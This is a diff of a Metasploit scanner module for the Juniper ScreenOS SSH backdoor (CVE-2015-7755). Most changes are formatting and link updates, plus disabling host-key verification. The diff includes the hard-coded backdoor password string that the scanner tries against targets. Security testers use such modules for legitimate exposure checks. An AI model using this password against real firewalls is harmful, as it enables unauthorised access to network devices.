@@ -1,12 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'net/ssh'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::SSH
@@ -24,10 +23,10 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'References'     => [
         ['CVE', '2015-7755'],
-        ['URL', 'https://community.rapid7.com/community/infosec/blog/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
+        ['URL', 'https://blog.rapid7.com/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
         ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713']
       ],
-      'DisclosureDate' => 'Dec 20 2015',
+      'DisclosureDate' => '2015-12-20',
       'License'        => MSF_LICENSE
     ))
 
@@ -44,11 +43,12 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     factory = ssh_socket_factory
     ssh_opts = {
-      port:         rport,
-      auth_methods: ['password', 'keyboard-interactive'],
-      password:     %q{<<< %s(un='%s') = %u},
-      proxy: factory,
-      :non_interactive => true
+      :port            => rport,
+      :auth_methods    => ['password', 'keyboard-interactive'],
+      :password        => %q{<<< %s(un='%s') = %u},
+      :proxy           => factory,
+      :non_interactive => true,
+      :verify_host_key => :never
     }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
@@ -80,5 +80,4 @@ class MetasploitModule < Msf::Auxiliary
   def rport
     datastore['RPORT']
   end
-
 end
